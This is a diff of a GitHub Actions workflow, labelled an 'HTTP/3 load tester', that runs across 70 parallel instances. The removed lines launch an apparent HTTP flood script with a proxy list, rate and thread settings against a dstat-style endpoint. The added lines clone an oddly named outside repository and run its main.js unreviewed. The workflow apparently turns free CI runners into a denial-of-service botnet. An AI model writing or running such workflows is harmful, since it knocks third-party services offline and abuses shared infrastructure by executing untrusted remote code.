@@ -33,14 +33,14 @@ jobs:
       
       
       - name: Install Node.js dependencies
-        run: npm install   fingerprint-generator axios chalk@4 colors request user-agents hpack
+        run: npm install axios
             
       - name: Run HTTP/3 load tester
         run: |
           
-          git clone https://github.com/Ggeg111/curly-octo-doodle.git
-          cd curly-octo-doodle
-          node m.js GET https://c2.dstatbot.win/6l5GqmH6 700 4 120 ya.txt --close
+          git clone  https://github.com/Uhnh9iiib8hrbr9hb9hb49y9rhh9c9h/legendary-enigma.git
+          cd legendary-enigma
+          node main.js  
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 70  # Updated to match the matrix count
